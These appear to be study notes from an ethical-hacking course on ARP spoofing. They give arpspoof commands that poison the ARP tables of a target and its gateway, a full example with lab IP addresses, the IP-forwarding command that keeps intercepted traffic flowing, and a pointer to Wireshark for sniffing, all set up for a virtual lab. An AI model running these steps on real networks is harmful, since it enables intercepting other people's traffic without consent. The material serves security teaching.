--> There are a number of tools you can do to run this attack
which is an arp spoofing attack, you can even build your own
here we are going to use a tool called arpspoof

ARP SPOOFING USING ARPSPOOF
- arpspoof tool to run arp spoofing attacks,
- simple and reliable
- ported to most operating systems including android and ios
- usage is always the same

use:
arpspoof -i [interface] -t [clientIP] [gatewayIP]
arpspoof -i [interface] -t [gatewayIP] [clientIP]

in the next ones we are going to use a tool called bettercap
because it has more features

note: you can only use this tool to redirect the flow of data
and make it flow through your computer then you'll have to use
another tool like a packet sniffer like wireshark to analyze 
this data and do more things with it

this is the full example: 
> arpspoof -i wlan0 -t 192.168.1.13 192.168.1.1
> arpspoof -i wlan0 -t 192.168.1.1 192.168.1.13

you should be doing the attack againts a virtual nat network
all you'll have to do is to make sure that the kali machine and
the windows machine are both configured to use the same NAT network

to see the change you have to do this command in the target machine:
> arp -a
you'll see that the mac address of the router is changed

note:
this arpspoof is not going to make your kali linux able 
to intercept datas therefore the internet or network is not
going to flow, you have to manually set it to work
using this command: 
> echo 1 > /proc/sys/net/ipv4/ip_forward
